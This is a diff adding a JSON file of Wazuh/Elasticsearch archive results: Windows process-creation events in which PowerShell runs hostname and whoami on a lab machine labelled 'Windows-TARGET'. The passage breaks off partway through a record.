@@ -1,0 +1,1843 @@
+{
+    "took": 6,
+    "timed_out": false,
+    "_shards": {
+        "total": 3,
+        "successful": 3,
+        "skipped": 0,
+        "failed": 0
+    },
+    "hits": {
+        "total": {
+            "value": 25,
+            "relation": "eq"
+        },
+        "max_score": null,
+        "hits": [
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "YRcBHZ4BTkZw-244UwPa",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x670c2",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                                "subjectDomainName": "WIN-C1OEL3I2PV8",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x1640",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\HOSTNAME.EXE",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "processId": "0x9cc",
+                                "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\HOSTNAME.EXE\\\"",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "AmineMSc"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x1640\r\n\tNew Process Name:\tC:\\Windows\\System32\\HOSTNAME.EXE\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x9cc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tProcess Command Line:\t\"C:\\WINDOWS\\system32\\HOSTNAME.EXE\"\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:24:42.5646116Z",
+                                "eventRecordID": "29640",
+                                "threadID": "7212",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 92,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:24:42.5646116Z\",\"eventRecordID\":\"29640\",\"processID\":\"4\",\"threadID\":\"7212\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x1640\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\HOSTNAME.EXE\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x9cc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\WINDOWS\\\\system32\\\\HOSTNAME.EXE\\\"\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"subjectUserName\":\"AmineMSc\",\"subjectDomainName\":\"WIN-C1OEL3I2PV8\",\"subjectLogonId\":\"0x670c2\",\"newProcessId\":\"0x1640\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\HOSTNAME.EXE\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x9cc\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\HOSTNAME.EXE\\\\\\\"\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:43.953Z",
+                    "location": "EventChannel",
+                    "id": "1778603083.3237024",
+                    "timestamp": "2026-05-12T16:24:43.953+0000"
+                },
+                "sort": [
+                    1778603083953
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "YhcBHZ4BTkZw-244UwPa",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x670c2",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                                "subjectDomainName": "WIN-C1OEL3I2PV8",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x15d0",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\whoami.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "processId": "0x9cc",
+                                "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\whoami.exe\\\"",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "AmineMSc"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x15d0\r\n\tNew Process Name:\tC:\\Windows\\System32\\whoami.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x9cc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tProcess Command Line:\t\"C:\\WINDOWS\\system32\\whoami.exe\"\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:24:42.5783847Z",
+                                "eventRecordID": "29641",
+                                "threadID": "7212",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 93,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:24:42.5783847Z\",\"eventRecordID\":\"29641\",\"processID\":\"4\",\"threadID\":\"7212\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x15d0\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\whoami.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x9cc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\WINDOWS\\\\system32\\\\whoami.exe\\\"\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"subjectUserName\":\"AmineMSc\",\"subjectDomainName\":\"WIN-C1OEL3I2PV8\",\"subjectLogonId\":\"0x670c2\",\"newProcessId\":\"0x15d0\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\whoami.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x9cc\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\whoami.exe\\\\\\\"\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:43.955Z",
+                    "location": "EventChannel",
+                    "id": "1778603083.3242906",
+                    "timestamp": "2026-05-12T16:24:43.955+0000"
+                },
+                "sort": [
+                    1778603083955
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "YxcBHZ4BTkZw-244UwPa",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x670c2",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                                "subjectDomainName": "WIN-C1OEL3I2PV8",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x26e4",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\HOSTNAME.EXE",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "processId": "0x9cc",
+                                "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\HOSTNAME.EXE\\\"",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "AmineMSc"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x26e4\r\n\tNew Process Name:\tC:\\Windows\\System32\\HOSTNAME.EXE\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x9cc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tProcess Command Line:\t\"C:\\WINDOWS\\system32\\HOSTNAME.EXE\"\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:24:42.6618360Z",
+                                "eventRecordID": "29642",
+                                "threadID": "9504",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 94,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:24:42.6618360Z\",\"eventRecordID\":\"29642\",\"processID\":\"4\",\"threadID\":\"9504\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x26e4\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\HOSTNAME.EXE\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x9cc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\WINDOWS\\\\system32\\\\HOSTNAME.EXE\\\"\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"subjectUserName\":\"AmineMSc\",\"subjectDomainName\":\"WIN-C1OEL3I2PV8\",\"subjectLogonId\":\"0x670c2\",\"newProcessId\":\"0x26e4\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\HOSTNAME.EXE\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x9cc\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\HOSTNAME.EXE\\\\\\\"\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:43.956Z",
+                    "location": "EventChannel",
+                    "id": "1778603083.3248772",
+                    "timestamp": "2026-05-12T16:24:43.956+0000"
+                },
+                "sort": [
+                    1778603083956
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "ZBcBHZ4BTkZw-244UwPa",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x670c2",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                                "subjectDomainName": "WIN-C1OEL3I2PV8",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0xb78",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\whoami.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "processId": "0x9cc",
+                                "commandLine": "\\\"C:\\\\WINDOWS\\\\system32\\\\whoami.exe\\\"",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "AmineMSc"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0xb78\r\n\tNew Process Name:\tC:\\Windows\\System32\\whoami.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x9cc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tProcess Command Line:\t\"C:\\WINDOWS\\system32\\whoami.exe\"\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:24:42.6710363Z",
+                                "eventRecordID": "29643",
+                                "threadID": "9504",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 95,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:24:42.6710363Z\",\"eventRecordID\":\"29643\",\"processID\":\"4\",\"threadID\":\"9504\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0xb78\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\whoami.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x9cc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\n\\tProcess Command Line:\\t\\\"C:\\\\WINDOWS\\\\system32\\\\whoami.exe\\\"\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"subjectUserName\":\"AmineMSc\",\"subjectDomainName\":\"WIN-C1OEL3I2PV8\",\"subjectLogonId\":\"0x670c2\",\"newProcessId\":\"0xb78\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\whoami.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x9cc\",\"commandLine\":\"\\\\\\\"C:\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\whoami.exe\\\\\\\"\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:43.965Z",
+                    "location": "EventChannel",
+                    "id": "1778603083.3254654",
+                    "timestamp": "2026-05-12T16:24:43.965+0000"
+                },
+                "sort": [
+                    1778603083965
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "ZRcBHZ4BTkZw-244UwPa",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x670c2",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                                "subjectDomainName": "WIN-C1OEL3I2PV8",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x143c",
+                                "mandatoryLabel": "S-1-16-12288",
